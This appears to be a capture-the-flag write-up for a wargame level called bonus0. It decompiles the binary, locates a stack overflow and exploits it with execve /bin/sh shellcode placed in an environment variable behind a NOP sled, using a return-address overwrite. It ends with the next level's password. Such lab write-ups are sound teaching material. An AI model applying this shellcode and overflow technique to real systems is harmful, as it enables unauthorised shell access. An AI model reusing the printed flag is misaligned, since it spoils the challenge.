get the binary on host
* `scp -P 4242 bonus0@192.168.56.107:./bonus0 ./binary/bonus0`

decompile using ghidras

```c
undefined4 main(void)
{
	undefined local_3a [54];
	
	pp(local_3a);
	puts(local_3a);
	return 0;
}

void pp(char param_1[54])
{
	char cVar1;
	uint uVar2;
	char *pcVar3;
	byte bVar4;
	undefined local_34 [20];
	undefined local_20 [20];
	
	bVar4 = 0;
	p(local_34, " - ");
	p(local_20, " - ");
	strcpy(param_1,local_34);
	uVar2 = 4294967295;
	pcVar3 = param_1;
	do {
		if (uVar2 == 0) break;
		uVar2 = uVar2 - 1;
		cVar1 = *pcVar3;
		pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
	} while (cVar1 != '\0');
	*(undefined2 *)(param_1 + (~uVar2 - 1)) = 0x20;
	strcat(param_1,local_20);
	return;
}

void p(undefined4 param_1,undefined4 param_2)
{
	undefined *puVar1;
	undefined local_100c [4104];

	puts(param_2);
	read(0,local_100c, 4096);
	puVar1 = (undefined *)strchr(local_100c,10);
	*puVar1 = 0;
	strncpy(param_1,local_100c,20);
	return;
}
```
shell code :\
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

We search the len of the second string for which the program segfault\
Via dichotomy we found 17 char :
`python -c "print 'A'* 4095 + '\n' + 'B' * 17" > /tmp/exploit_bonus0; cat /tmp/exploit_bonus0 | ./bonus0`

We can't put our shellcode in the input of bonus0 so let's put it in the env and give bonus0 the addr of this env variable
`export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`
To get the addr we make a small program:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (argc != 2)
		return (printf("need te env var you want the addr of\n"));
	printf("Var [%s] at addr [%p] = [%s]\n", argv[1], getenv(argv[1]), getenv(argv[1]));
	return 0;
}
```
We get this addr : `0xbffff82e` so we can do this to 

`python -c "print 'A'* 4095 + '\n' + 'B' * 9 + '\x2e\xf8\xff\xbf' + 'OSEF' * 20" > /tmp/exploit_bonus0; cat /tmp/exploit_bonus0 - | ./bonus0`
```
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```